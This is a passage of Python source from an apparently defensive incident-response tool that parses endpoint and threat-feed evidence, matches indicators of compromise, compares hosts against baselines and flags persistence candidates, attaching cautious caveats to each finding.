    ev = make_evidence(c, case_id, "security_control_state", now, "mdm")
    evidences.append(ev)

    host_id = c.get("host_id") or default_host_id
    control_id = str(c.get("control_id") or stable_id("CTRL", host_id, c.get("control_type"), c.get("product")))

    limitations: List[str] = list(c.get("limitations", []) or [])

    if not c.get("state"):
        limitations.append("CONTROL_STATE_UNKNOWN")

    return SecurityControlObject(
        control_id=control_id,
        host_id=host_id,
        control_type=str(c.get("control_type", "UNKNOWN")).upper(),
        product=c.get("product"),
        version=c.get("version"),
        state=enum_from_name(SecurityControlState, c.get("state"), SecurityControlState.UNKNOWN),
        last_updated=parse_dt(c.get("last_updated")),
        healthy=c.get("healthy"),
        policy=c.get("policy"),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(c.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in c.items() if k not in {"evidence_ids", "limitations", "confidence"}}),
    )


def parse_connection(
    c: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> ConnectionObject:
    ev = make_evidence(c, case_id, "network_connection_observation", now, "edr")
    evidences.append(ev)

    host_id = c.get("host_id") or default_host_id
    connection_id = str(
        c.get("connection_id")
        or stable_id(
            "CONN",
            host_id,
            c.get("local_pid"),
            c.get("remote_ip"),
            c.get("remote_domain"),
            c.get("remote_port"),
            c.get("start_time"),
        )
    )

    limitations: List[str] = list(c.get("limitations", []) or [])

    if not c.get("remote_ip") and not c.get("remote_domain"):
        limitations.append("REMOTE_ENDPOINT_INCOMPLETE")

    return ConnectionObject(
        connection_id=connection_id,
        host_id=host_id,
        local_process_id=c.get("local_process_id"),
        local_pid=int(c["local_pid"]) if c.get("local_pid") is not None else None,
        local_endpoint=c.get("local_endpoint"),
        remote_ip=c.get("remote_ip"),
        remote_domain=c.get("remote_domain"),
        remote_port=int(c["remote_port"]) if c.get("remote_port") is not None else None,
        protocol=c.get("protocol"),
        state=c.get("state"),
        bytes_sent=int(c["bytes_sent"]) if c.get("bytes_sent") is not None else None,
        bytes_received=int(c["bytes_received"]) if c.get("bytes_received") is not None else None,
        start_time=parse_dt(c.get("start_time") or c.get("event_at")),
        end_time=parse_dt(c.get("end_time")),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(c.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in c.items() if k not in {"evidence_ids", "limitations", "confidence"}}),
    )


def parse_dns(
    d: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> DNSArtifactObject:
    ev = make_evidence(d, case_id, "dns_artifact", now, "edr")
    evidences.append(ev)

    host_id = d.get("host_id") or default_host_id
    dns_id = str(d.get("dns_id") or stable_id("DNS", host_id, d.get("queried_domain"), d.get("timestamp")))

    return DNSArtifactObject(
        dns_id=dns_id,
        host_id=host_id,
        process_id=d.get("process_id"),
        queried_domain=d.get("queried_domain") or d.get("domain"),
        resolved_ips=[str(x) for x in d.get("resolved_ips", []) or []],
        query_type=d.get("query_type"),
        timestamp=parse_dt(d.get("timestamp") or d.get("event_at")),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(d.get("confidence", ev.reliability))),
        limitations=list(d.get("limitations", []) or []),
        details=redact_mapping({k: v for k, v in d.items() if k not in {"evidence_ids", "limitations", "confidence", "resolved_ips"}}),
    )


def parse_alert(
    a: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> AlertObject:
    ev = make_evidence(a, case_id, "security_alert", now, "edr")
    evidences.append(ev)

    host_id = a.get("host_id") or default_host_id
    alert_id = str(a.get("alert_id") or stable_id("ALERT", host_id, a.get("alert_name"), a.get("detection_time"), a.get("upstream_event_id")))

    limitations: List[str] = list(a.get("limitations", []) or [])
    limitations.append("ALERT_IS_DETECTION_EVENT_NOT_COMPROMISE_PROOF")

    return AlertObject(
        alert_id=alert_id,
        host_id=host_id,
        alert_name=a.get("alert_name"),
        rule=a.get("rule"),
        severity=a.get("severity"),
        detection_time=parse_dt(a.get("detection_time") or a.get("event_at")),
        process_id=a.get("process_id"),
        file_id=a.get("file_id"),
        ioc=a.get("ioc"),
        upstream_event_id=a.get("upstream_event_id"),
        correlation_id=a.get("correlation_id"),
        status=a.get("status"),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(a.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in a.items() if k not in {"evidence_ids", "limitations", "confidence"}}),
    )


def parse_ioc(
    i: Dict[str, Any],
    case_id: str,
    now: datetime,
    evidences: List[EvidenceRef],
) -> IOCObject:
    ev = make_evidence(i, case_id, "indicator", now, "threat_feed")
    evidences.append(ev)

    ioc_id = str(i.get("ioc_id") or stable_id("IOC", i.get("ioc_type"), i.get("value"), i.get("source")))

    limitations: List[str] = list(i.get("limitations", []) or [])
    limitations.append("IOC_MATCH_REQUIRES_CONTEXT_AND_FRESHNESS")

    return IOCObject(
        ioc_id=ioc_id,
        ioc_type=str(i.get("ioc_type", "unknown")).lower(),
        value=str(i.get("value", "")).strip().lower(),
        first_published=parse_dt(i.get("first_published")),
        last_updated=parse_dt(i.get("last_updated")),
        current_status=i.get("current_status"),
        source=i.get("source"),
        campaign=i.get("campaign"),
        malware_family=i.get("malware_family"),
        confidence=clamp(float(i.get("confidence", ev.reliability))),
        evidence_ids=[ev.evidence_id],
        limitations=sorted(set(limitations)),
        details=redact_mapping({k: v for k, v in i.items() if k not in {"evidence_ids", "limitations", "confidence", "value"}}),
    )


def parse_baseline(
    b: Dict[str, Any],
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> BaselineObject:
    ev = make_evidence(b, case_id, "baseline", now, "gold_image")
    evidences.append(ev)

    baseline_id = str(b.get("baseline_id") or stable_id("BASE", b.get("host_id") or default_host_id, b.get("version")))

    limitations: List[str] = list(b.get("limitations", []) or [])

    if b.get("source") in {"peer_hosts", "historical_host_state"}:
        limitations.append("PEER_OR_HISTORICAL_BASELINE_MAY_HAVE_ROLE_DIFFERENCES")

    return BaselineObject(
        baseline_id=baseline_id,
        host_id=b.get("host_id") or default_host_id,
        version=b.get("version"),
        expected_software=[str(x) for x in b.get("expected_software", []) or []],
        expected_services=[str(x) for x in b.get("expected_services", []) or []],
        expected_tasks=[str(x) for x in b.get("expected_tasks", []) or []],
        expected_ports=[int(x) for x in b.get("expected_ports", []) or [] if str(x).isdigit()],
        expected_processes=[str(x) for x in b.get("expected_processes", []) or []],
        expected_users=[str(x) for x in b.get("expected_users", []) or []],
        expected_config=dict(b.get("expected_config", {}) or {}),
        normal_connections=[str(x) for x in b.get("normal_connections", []) or []],
        source=b.get("source"),
        valid_from=parse_dt(b.get("valid_from")),
        valid_to=parse_dt(b.get("valid_to")),
        evidence_ids=[ev.evidence_id],
        confidence=clamp(float(b.get("confidence", ev.reliability))),
        limitations=sorted(set(limitations)),
    )


def parse_generic_collection(
    items: List[Dict[str, Any]],
    artifact_type: str,
    case_id: str,
    default_host_id: Optional[str],
    now: datetime,
    evidences: List[EvidenceRef],
) -> List[Dict[str, Any]]:
    out: List[Dict[str, Any]] = []

    for item in items or []:
        ev = make_evidence(item, case_id, artifact_type, now, "endpoint_inventory")
        evidences.append(ev)

        item["host_id"] = item.get("host_id") or default_host_id
        item["artifact_type"] = artifact_type
        item["evidence_ids"] = item.get("evidence_ids", [])
        item["confidence"] = clamp(float(item.get("confidence", ev.reliability)))
        item["limitations"] = sorted(set(item.get("limitations", []) or []))
        item["details"] = redact_mapping({k: v for k, v in item.items() if k not in {"evidence_ids", "limitations", "confidence", "details"}})

        out.append(item)

    return out


# ==============================================================================
# ANALYSIS FUNCTIONS
# ==============================================================================

def build_process_tree(processes: List[ProcessObject]) -> None:
    by_host_pid: Dict[Tuple[Optional[str], Optional[int]], List[ProcessObject]] = defaultdict(list)

    for p in processes:
        if p.pid is not None:
            by_host_pid[(p.host_id, p.pid)].append(p)

    for p in processes:
        if p.ppid is None:
            continue

        candidates = by_host_pid.get((p.host_id, p.ppid), [])
        if not candidates:
            continue

        if p.start_time:
            timed = [c for c in candidates if c.start_time and c.start_time <= p.start_time]
            if timed:
                parent = max(timed, key=lambda x: x.start_time or datetime.min.replace(tzinfo=timezone.utc))
            else:
                parent = candidates[0]
        else:
            parent = candidates[0]

        p.parent_process_id = parent.process_id
        if p.process_id not in parent.child_process_ids:
            parent.child_process_ids.append(p.process_id)


def associate_connections_to_processes(processes: List[ProcessObject], connections: List[ConnectionObject]) -> None:
    by_host_pid: Dict[Tuple[Optional[str], Optional[int]], List[ConnectionObject]] = defaultdict(list)

    for c in connections:
        if c.local_pid is not None:
            by_host_pid[(c.host_id, c.local_pid)].append(c)

    for p in processes:
        if p.pid is None:
            continue

        for c in by_host_pid.get((p.host_id, p.pid), []):
            if c.connection_id not in p.network_connection_ids:
                p.network_connection_ids.append(c.connection_id)
            c.local_process_id = p.process_id


def compute_ioc_freshness(ioc: IOCObject, now: datetime) -> IOCFreshness:
    status = str(ioc.current_status or "").lower()

    if status in {"active", "current", "live", "verified_current"}:
        return IOCFreshness.CURRENT

    if status in {"expired", "retired", "stale", "deprecated"}:
        return IOCFreshness.STALE

    if ioc.first_published:
        age_days = (now - ioc.first_published).days
        if age_days <= 30:
            return IOCFreshness.CURRENT
        if age_days <= 180:
            return IOCFreshness.RECENT
        return IOCFreshness.STALE

    return IOCFreshness.UNKNOWN


def match_iocs(
    iocs: List[IOCObject],
    processes: List[ProcessObject],
    files: List[FileObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    generic: Dict[str, List[Dict[str, Any]]],
    now: datetime,
) -> List[IocMatch]:
    matches: List[IocMatch] = []

    def add_match(
        ioc: IOCObject,
        relation_type: str,
        observed: bool,
        object_type: str,
        object_id: str,
        host_id: Optional[str],
        value: str,
        timestamp: Optional[datetime],
        confidence: float,
        evidence_ids: List[str],
        limitations: Optional[List[str]] = None,
    ) -> None:
        matches.append(
            IocMatch(
                match_id=new_id("IOC_MATCH"),
                ioc_id=ioc.ioc_id,
                host_id=host_id,
                relation_type=relation_type,
                observed=observed,
                object_type=object_type,
                object_id=object_id,
                value=value,
                timestamp=timestamp,
                freshness=compute_ioc_freshness(ioc, now),
                confidence=clamp(confidence),
                evidence_ids=sorted(set(evidence_ids)),
                limitations=sorted(set((limitations or []) + ioc.limitations)),
            )
        )

    for ioc in iocs:
        value = ioc.value.lower()
        freshness = compute_ioc_freshness(ioc, now)

        if ioc.ioc_type in {"sha256", "hash", "md5"}:
            for f in files:
                if value in {str(f.sha256 or "").lower(), str(f.md5 or "").lower()}:
                    add_match(
                        ioc=ioc,
                        relation_type="FILE_HASH_PRESENT",
                        observed=False,
                        object_type="file",
                        object_id=f.file_id,
                        host_id=f.host_id,
                        value=value,
                        timestamp=f.first_seen or f.created_at,
                        confidence=f.confidence,
                        evidence_ids=f.evidence_ids,
                        limitations=["File hash presence does not prove execution."],
                    )

            for p in processes:
                if value == str(p.sha256 or "").lower():
                    observed = bool(p.start_time and p.source_type in HIGH_TRUST_SOURCES)
                    add_match(
                        ioc=ioc,
                        relation_type="PROCESS_EXECUTED_IOC_HASH" if observed else "PROCESS_IOC_HASH_CONTEXT",
                        observed=observed,
                        object_type="process",
                        object_id=p.process_id,
                        host_id=p.host_id,
                        value=value,
                        timestamp=p.start_time,
                        confidence=p.confidence,
                        evidence_ids=p.evidence_ids,
                        limitations=["Process hash IOC match does not establish maliciousness or actor attribution."],
                    )

        elif ioc.ioc_type == "domain":
            for d in dns:
                if value == str(d.queried_domain or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="DNS_RESOLUTION_OBSERVED",
                        observed=True,
                        object_type="dns_artifact",
                        object_id=d.dns_id,
                        host_id=d.host_id,
                        value=value,
                        timestamp=d.timestamp,
                        confidence=d.confidence,
                        evidence_ids=d.evidence_ids,
                        limitations=["DNS resolution alone does not prove successful network connection."],
                    )

            for c in connections:
                if value == str(c.remote_domain or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="NETWORK_CONNECTION_OBSERVED",
                        observed=True,
                        object_type="connection",
                        object_id=c.connection_id,
                        host_id=c.host_id,
                        value=value,
                        timestamp=c.start_time,
                        confidence=c.confidence,
                        evidence_ids=c.evidence_ids,
                        limitations=["Connection to IOC domain does not automatically prove C2 or exfiltration."],
                    )

            for f in files:
                if value in [str(x).lower() for x in f.embedded_iocs]:
                    add_match(
                        ioc=ioc,
                        relation_type="EMBEDDED_INDICATOR",
                        observed=False,
                        object_type="file",
                        object_id=f.file_id,
                        host_id=f.host_id,
                        value=value,
                        timestamp=f.first_seen,
                        confidence=f.confidence,
                        evidence_ids=f.evidence_ids,
                        limitations=["Embedded indicator string does not prove host contacted it."],
                    )

        elif ioc.ioc_type == "ip":
            for c in connections:
                if value == str(c.remote_ip or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="NETWORK_CONNECTION_OBSERVED",
                        observed=True,
                        object_type="connection",
                        object_id=c.connection_id,
                        host_id=c.host_id,
                        value=value,
                        timestamp=c.start_time,
                        confidence=c.confidence,
                        evidence_ids=c.evidence_ids,
                        limitations=["Connection to IOC IP may be scanner, sinkhole, security lookup, or benign service."],
                    )

            for d in dns:
                if value in [str(x).lower() for x in d.resolved_ips]:
                    add_match(
                        ioc=ioc,
                        relation_type="DNS_RESOLUTION_OBSERVED",
                        observed=True,
                        object_type="dns_artifact",
                        object_id=d.dns_id,
                        host_id=d.host_id,
                        value=value,
                        timestamp=d.timestamp,
                        confidence=d.confidence,
                        evidence_ids=d.evidence_ids,
                        limitations=["Resolved IP IOC match does not prove connection or malicious intent."],
                    )

        elif ioc.ioc_type == "url":
            for f in files:
                if value in [str(x).lower() for x in f.embedded_iocs]:
                    add_match(
                        ioc=ioc,
                        relation_type="EMBEDDED_INDICATOR",
                        observed=False,
                        object_type="file",
                        object_id=f.file_id,
                        host_id=f.host_id,
                        value=value,
                        timestamp=f.first_seen,
                        confidence=f.confidence,
                        evidence_ids=f.evidence_ids,
                        limitations=["Embedded URL does not prove retrieval or execution."],
                    )

        elif ioc.ioc_type in {"path", "file_path", "directory"}:
            for f in files:
                if value == str(f.path or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="PATH_PRESENT",
                        observed=False,
                        object_type="file",
                        object_id=f.file_id,
                        host_id=f.host_id,
                        value=value,
                        timestamp=f.first_seen,
                        confidence=f.confidence,
                        evidence_ids=f.evidence_ids,
                        limitations=["Path presence does not prove execution or maliciousness."],
                    )

            for s in services:
                if value == str(s.binary_path or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="SERVICE_IOC_BINARY_PATH",
                        observed=bool(s.created_at or s.modified_at),
                        object_type="service",
                        object_id=s.service_id,
                        host_id=s.host_id,
                        value=value,
                        timestamp=s.created_at or s.modified_at,
                        confidence=s.confidence,
                        evidence_ids=s.evidence_ids,
                        limitations=["Service binary path IOC match requires publisher/path/timeline context."],
                    )

            for t in tasks:
                if value in str(t.action or "").lower():
                    add_match(
                        ioc=ioc,
                        relation_type="TASK_IOC_ACTION_PATH",
                        observed=bool(t.created_at or t.modified_at),
                        object_type="scheduled_task",
                        object_id=t.task_id,
                        host_id=t.host_id,
                        value=value,
                        timestamp=t.created_at or t.modified_at,
                        confidence=t.confidence,
                        evidence_ids=t.evidence_ids,
                        limitations=["Scheduled task action IOC match does not prove task execution."],
                    )

        elif ioc.ioc_type == "process_name":
            for p in processes:
                if value == str(p.image or "").lower():
                    observed = bool(p.start_time and p.source_type in HIGH_TRUST_SOURCES)
                    add_match(
                        ioc=ioc,
                        relation_type="PROCESS_EXECUTED_IOC_NAME" if observed else "PROCESS_NAME_IOC_CONTEXT",
                        observed=observed,
                        object_type="process",
                        object_id=p.process_id,
                        host_id=p.host_id,
                        value=value,
                        timestamp=p.start_time,
                        confidence=p.confidence,
                        evidence_ids=p.evidence_ids,
                        limitations=["Process name IOC match is weak without path/hash/signature/behavior context."],
                    )

        elif ioc.ioc_type in {"registry_key", "registry_value"}:
            for reg in generic.get("registry_artifacts", []):
                key = str(reg.get("key") or reg.get("path") or reg.get("name") or "").lower()
                val = str(reg.get("value") or "").lower()
                if value in key or value in val:
                    add_match(
                        ioc=ioc,
                        relation_type="REGISTRY_IOC_CONTEXT",
                        observed=False,
                        object_type="registry_artifact",
                        object_id=str(reg.get("artifact_id") or reg.get("key") or new_id("REG")),
                        host_id=reg.get("host_id"),
                        value=value,
                        timestamp=parse_dt(reg.get("last_written") or reg.get("observed_at")),
                        confidence=float(reg.get("confidence", 0.5)),
                        evidence_ids=reg.get("evidence_ids", []),
                        limitations=["Registry IOC context requires baseline and change history."],
                    )

        # Unused freshness variable kept for clarity.
        _ = freshness

    return matches


def analyze_source_independence(evidences: List[EvidenceRef]) -> Dict[str, Any]:
    upstream_groups: Dict[str, List[str]] = defaultdict(list)
    source_groups: Dict[str, List[str]] = defaultdict(list)

    for ev in evidences:
        upstream_groups[ev.upstream_source_id].append(ev.evidence_id)
        source_groups[ev.source_id].append(ev.evidence_id)

    dependent_roots = {root for root, ids in upstream_groups.items() if len(ids) > 1}

    if not upstream_groups:
        state = SourceIndependenceState.UNKNOWN
    elif not dependent_roots:
        state = SourceIndependenceState.INDEPENDENT
    elif len(dependent_roots) < len(upstream_groups):
        state = SourceIndependenceState.PARTIALLY_DEPENDENT
    else:
        state = SourceIndependenceState.DEPENDENT

    return {
        "state": state.name,
        "total_evidence_items": len(evidences),
        "unique_sources": len(source_groups),
        "unique_upstream_families": len(upstream_groups),
        "dependent_upstream_families": sorted(dependent_roots),
        "upstream_groups": {root: sorted(ids) for root, ids in upstream_groups.items()},
    }


def deduplicate_alerts(alerts: List[AlertObject]) -> Tuple[List[AlertObject], List[Dict[str, Any]]]:
    groups: Dict[str, List[AlertObject]] = defaultdict(list)
    log: List[Dict[str, Any]] = []

    for a in alerts:
        key = a.upstream_event_id or a.correlation_id or a.alert_id
        groups[key].append(a)

    unique: List[AlertObject] = []

    for key, items in groups.items():
        best = max(items, key=lambda x: (x.confidence, x.detection_time or datetime.min.replace(tzinfo=timezone.utc)))
        unique.append(best)

        if len(items) > 1:
            log.append(
                {
                    "group_key": key,
                    "representative_alert_id": best.alert_id,
                    "duplicate_alert_ids": [a.alert_id for a in items if a.alert_id != best.alert_id],
                    "interpretation": "Multiple alerts may represent the same upstream detection event family.",
                }
            )

    return unique, log


def current_observed_ioc_ids(ioc_matches: List[IocMatch]) -> Set[str]:
    return {
        m.object_id
        for m in ioc_matches
        if m.observed and m.freshness == IOCFreshness.CURRENT and m.relation_type in OBSERVED_IOC_RELATIONS
    }


def current_ioc_object_ids(ioc_matches: List[IocMatch]) -> Set[str]:
    return {m.object_id for m in ioc_matches if m.freshness == IOCFreshness.CURRENT}


def severity_for_change(
    change_type: str,
    object_id: Optional[str],
    ioc_matches: List[IocMatch],
    controls: List[SecurityControlObject],
    incident_context: Dict[str, Any],
) -> AnomalyState:
    curr_obs = current_observed_ioc_ids(ioc_matches)
    curr_any = current_ioc_object_ids(ioc_matches)

    if object_id and object_id in curr_obs:
        return AnomalyState.MATERIAL_SECURITY_SIGNAL

    if object_id and object_id in curr_any:
        return AnomalyState.SUSPICIOUS

    if change_type in {"NEW_SERVICE", "NEW_TASK", "NEW_DRIVER", "NEW_MODULE", "NEW_AUTORUN", "SECURITY_CONTROL_CHANGE"}:
        if incident_context.get("suspected_incident"):
            return AnomalyState.SUSPICIOUS

        bad_controls = [c for c in controls if c.state in (SecurityControlState.OFFLINE, SecurityControlState.DISABLED_REPORTED, SecurityControlState.UNHEALTHY)]
        if bad_controls:
            return AnomalyState.SUSPICIOUS

    if change_type in {"NEW_PROCESS", "NEW_FILE", "NEW_CONNECTION", "NEW_DNS"}:
        if incident_context.get("suspected_incident"):
            return AnomalyState.UNUSUAL

    return AnomalyState.UNUSUAL


def compare_baseline(
    baselines: List[BaselineObject],
    processes: List[ProcessObject],
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    files: List[FileObject],
    connections: List[ConnectionObject],
    dns: List[DNSArtifactObject],
    controls: List[SecurityControlObject],
    generic: Dict[str, List[Dict[str, Any]]],
    ioc_matches: List[IocMatch],
    incident_context: Dict[str, Any],
) -> Tuple[List[ChangeObject], List[AnomalyObject]]:
    changes: List[ChangeObject] = []
    anomalies: List[AnomalyObject] = []

    for b in baselines:
        host_id = b.host_id

        exp_services = {s.lower() for s in b.expected_services}
        exp_tasks = {t.lower() for t in b.expected_tasks}
        exp_processes = {p.lower() for p in b.expected_processes}
        exp_software = {s.lower() for s in b.expected_software}
        exp_users = {u.lower() for u in b.expected_users}
        exp_ports = set(b.expected_ports)
        normal_connections = {c.lower() for c in b.normal_connections}

        for svc in services:
            if svc.host_id != host_id:
                continue
            if svc.name and svc.name.lower() not in exp_services:
                change = ChangeObject(
                    change_id=new_id("CHANGE"),
                    host_id=host_id,
                    change_type="NEW_SERVICE",
                    object_id=svc.service_id,
                    old_value=None,
                    new_value=svc.name,
                    detected_at=svc.created_at or svc.modified_at,
                    source=b.source,
                    baseline_id=b.baseline_id,
                    evidence_ids=svc.evidence_ids,
                    confidence=svc.confidence,
                    limitations=["New service relative to baseline; may be legitimate software, update, administration, or suspicious persistence."],
                )
                changes.append(change)
                anomalies.append(
                    AnomalyObject(
                        anomaly_id=new_id("ANOM"),
                        host_id=host_id,
                        artifact=f"service:{svc.name}",
                        baseline=b.baseline_id,
                        difference="Service not present in baseline.",
                        first_seen=svc.created_at,
                        last_seen=svc.modified_at,
                        severity=severity_for_change(change.change_type, svc.service_id, ioc_matches, controls, incident_context),
                        context="Baseline comparison.",
                        evidence_ids=svc.evidence_ids,
                        confidence=svc.confidence,
                        limitations=["Baseline difference is not compromise proof."],
                    )
                )

        for task in tasks:
            if task.host_id != host_id:
                continue
            if task.name and task.name.lower() not in exp_tasks:
                change = ChangeObject(
                    change_id=new_id("CHANGE"),
                    host_id=host_id,
                    change_type="NEW_TASK",
                    object_id=task.task_id,
                    old_value=None,
                    new_value=task.name,
                    detected_at=task.created_at or task.modified_at,
                    source=b.source,
                    baseline_id=b.baseline_id,
                    evidence_ids=task.evidence_ids,
                    confidence=task.confidence,
                    limitations=["New scheduled task relative to baseline; may be legitimate automation or persistence candidate."],
                )
                changes.append(change)
                anomalies.append(
                    AnomalyObject(
                        anomaly_id=new_id("ANOM"),
                        host_id=host_id,
                        artifact=f"task:{task.name}",
                        baseline=b.baseline_id,
                        difference="Scheduled task not present in baseline.",
                        first_seen=task.created_at,
                        last_seen=task.modified_at,
                        severity=severity_for_change(change.change_type, task.task_id, ioc_matches, controls, incident_context),
                        context="Baseline comparison.",
                        evidence_ids=task.evidence_ids,
                        confidence=task.confidence,
                        limitations=["Scheduled task configuration does not prove execution."],
                    )
                )

        for proc in processes:
            if proc.host_id != host_id:
                continue
            if proc.image and proc.image.lower() not in exp_processes:
                change = ChangeObject(
                    change_id=new_id("CHANGE"),
                    host_id=host_id,
                    change_type="NEW_PROCESS",
                    object_id=proc.process_id,
                    old_value=None,
                    new_value=proc.image,
                    detected_at=proc.start_time,
                    source=b.source,
                    baseline_id=b.baseline_id,
                    evidence_ids=proc.evidence_ids,
                    confidence=proc.confidence,
                    limitations=["Unexpected process relative to baseline; may be legitimate new software, admin tool, update, or suspicious execution."],
                )
                changes.append(change)
                anomalies.append(
                    AnomalyObject(
                        anomaly_id=new_id("ANOM"),
                        host_id=host_id,
                        artifact=f"process:{proc.image}",
                        baseline=b.baseline_id,
                        difference="Process not present in baseline.",
                        first_seen=proc.start_time,
                        last_seen=proc.end_time,
                        severity=severity_for_change(change.change_type, proc.process_id, ioc_matches, controls, incident_context),
                        context="Baseline comparison.",
                        evidence_ids=proc.evidence_ids,
                        confidence=proc.confidence,
                        limitations=["Process name alone does not establish program identity or maliciousness."],
                    )
                )

        for f in files:
            if f.host_id != host_id:
                continue
            if f.filename and f.filename.lower() not in exp_software and f.path and "install" not in f.path.lower():
                # Only flag notable executable-like files to avoid noisy file-system changes.
                if str(f.path or "").lower().endswith((".exe", ".dll", ".sys", ".ps1", ".vbs", ".js", ".bat", ".cmd")):
                    change = ChangeObject(
                        change_id=new_id("CHANGE"),
                        host_id=host_id,
                        change_type="NEW_EXECUTABLE_FILE",
                        object_id=f.file_id,
                        old_value=None,
                        new_value=f.path,
                        detected_at=f.created_at or f.first_seen,
                        source=b.source,
                        baseline_id=b.baseline_id,
                        evidence_ids=f.evidence_ids,
                        confidence=f.confidence,
                        limitations=["New executable file relative to baseline; file presence does not prove execution."],
                    )
                    changes.append(change)
                    anomalies.append(
                        AnomalyObject(
                            anomaly_id=new_id("ANOM"),
                            host_id=host_id,
                            artifact=f"file:{f.path}",
                            baseline=b.baseline_id,
                            difference="Executable file not present in baseline.",
                            first_seen=f.created_at or f.first_seen,
                            last_seen=f.last_seen,
                            severity=severity_for_change(change.change_type, f.file_id, ioc_matches, controls, incident_context),
                            context="Baseline comparison.",
                            evidence_ids=f.evidence_ids,
                            confidence=f.confidence,
                            limitations=["File presence is not execution evidence."],
                        )
                    )

        for c in connections:
            if c.host_id != host_id:
                continue
            remote = str(c.remote_domain or c.remote_ip or "").lower()
            if remote and remote not in normal_connections:
                if exp_ports and c.remote_port not in exp_ports:
                    change = ChangeObject(
                        change_id=new_id("CHANGE"),
                        host_id=host_id,
                        change_type="NEW_CONNECTION_PORT",
                        object_id=c.connection_id,
                        old_value=None,
                        new_value=f"{remote}:{c.remote_port}",
                        detected_at=c.start_time,
                        source=b.source,
                        baseline_id=b.baseline_id,
                        evidence_ids=c.evidence_ids,
                        confidence=c.confidence,
                        limitations=["Unexpected connection/port relative to baseline; may be legitimate service, update, telemetry, or suspicious activity."],
                    )
                    changes.append(change)
                    anomalies.append(
                        AnomalyObject(
                            anomaly_id=new_id("ANOM"),
                            host_id=host_id,
                            artifact=f"connection:{remote}:{c.remote_port}",
                            baseline=b.baseline_id,
                            difference="Connection endpoint/port not present in baseline.",
                            first_seen=c.start_time,
                            last_seen=c.end_time,
                            severity=severity_for_change(change.change_type, c.connection_id, ioc_matches, controls, incident_context),
                            context="Baseline comparison.",
                            evidence_ids=c.evidence_ids,
                            confidence=c.confidence,
                            limitations=["Connection alone does not prove C2 or exfiltration."],
                        )
                    )

        for sw in generic.get("software", []):
            if sw.get("host_id") != host_id:
                continue
            name = str(sw.get("name") or sw.get("product") or "").lower()
            if name and name not in exp_software:
                change = ChangeObject(
                    change_id=new_id("CHANGE"),
                    host_id=host_id,
                    change_type="NEW_SOFTWARE",
                    object_id=str(sw.get("software_id") or name),
                    old_value=None,
                    new_value=sw.get("version"),
                    detected_at=parse_dt(sw.get("install_date") or sw.get("observed_at")),
                    source=b.source,
                    baseline_id=b.baseline_id,
                    evidence_ids=sw.get("evidence_ids", []),
                    confidence=float(sw.get("confidence", 0.5)),
                    limitations=["Installed software does not prove execution or business use."],
                )
                changes.append(change)

        for proc in processes:
            if proc.host_id != host_id:
                continue
            if proc.user_context and exp_users and proc.user_context.lower() not in exp_users:
                change = ChangeObject(
                    change_id=new_id("CHANGE"),
                    host_id=host_id,
                    change_type="UNEXPECTED_ACCOUNT_ACTIVITY",
                    object_id=proc.process_id,
                    old_value=None,
                    new_value=proc.user_context,
                    detected_at=proc.start_time,
                    source=b.source,
                    baseline_id=b.baseline_id,
                    evidence_ids=proc.evidence_ids,
                    confidence=proc.confidence,
                    limitations=["Account activity does not identify a real person; may be service, automation, shared account, or compromised account."],
                )
                changes.append(change)

    return changes, anomalies


def analyze_persistence(
    services: List[ServiceObject],
    tasks: List[ScheduledTaskObject],
    generic: Dict[str, List[Dict[str, Any]]],
    ioc_matches: List[IocMatch],
    changes: List[ChangeObject],
    incident_context: Dict[str, Any],
) -> List[PersistenceIndicator]:
    indicators: List[PersistenceIndicator] = []

    curr_obs = current_observed_ioc_ids(ioc_matches)
    curr_any = current_ioc_object_ids(ioc_matches)
    unexpected_ids = {c.object_id for c in changes if c.change_type in {"NEW_SERVICE", "NEW_TASK", "NEW_AUTORUN"}}

    for svc in services:
        state = PersistenceState.PERSISTENCE_MECHANISM_OBSERVED
        reason = "Service configuration observed on host."

        if svc.service_id in curr_obs or svc.service_id in curr_any or svc.service_id in unexpected_ids:
            state = PersistenceState.PERSISTENCE_CANDIDATE
            reason += " Unexpected or IOC-relevant service context."
        elif svc.publisher and svc.signature_valid and svc.service_id not in unexpected_ids:
            state = PersistenceState.LEGITIMATE_STARTUP_CANDIDATE
            reason += " Signed/publisher context supports legitimate startup candidate."
        elif str(svc.start_type or "").lower() == "auto" and not svc.publisher:
            state = PersistenceState.UNKNOWN
            reason += " Auto-start service without sufficient publisher/signature context."

        indicators.append(
            PersistenceIndicator(
                indicator_id=new_id("PERS"),
                host_id=svc.host_id,
                mechanism="SERVICE",
                object_id=svc.service_id,
                state=state,
                reason=reason,
                evidence_ids=svc.evidence_ids,
                confidence=svc.confidence,
                limitations=[
                    "Service presence does not automatically mean malicious persistence.",
                    "Legitimate software, administrators, services, and installers may configure services.",
                ],
            )
        )

    for task in tasks:
        state = PersistenceState.PERSISTENCE_MECHANISM_OBSERVED
        reason = "Scheduled task configuration observed on host."

        if task.task_id in curr_obs or task.task_id in curr_any or task.task_id in unexpected_ids:
            state = PersistenceState.PERSISTENCE_CANDIDATE
            reason += " Unexpected or IOC-relevant task context."
        elif task.task_id not in unexpected_ids and not incident_context.get("suspected_incident"):
            state = PersistenceState.LEGITIMATE_STARTUP_CANDIDATE
            reason += " No immediate unexpected/IOC context."

        indicators.append(
